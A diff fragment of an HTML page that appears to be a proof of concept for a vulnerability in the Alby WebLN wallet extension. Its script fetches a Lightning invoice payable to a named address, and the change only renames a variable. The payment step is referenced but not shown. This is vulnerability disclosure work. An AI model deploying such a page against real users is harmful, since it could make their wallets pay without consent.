@@ -17,8 +17,8 @@
     </style>
     <script>
       async function getInvoice(amount) {
-        const zbdData = await fetch(`https://getalby.com/lnurlp/aaron/callback?amount=${amount}&comment=Alby%20Vulnerability%20PoC`);
-        return (await zbdData.json()).pr;
+        const lnurlData = await fetch(`https://getalby.com/lnurlp/aaron/callback?amount=${amount}&comment=Alby%20Vulnerability%20PoC`);
+        return (await lnurlData.json()).pr;
       }
 
       async function sendUsingWebLnExec() {
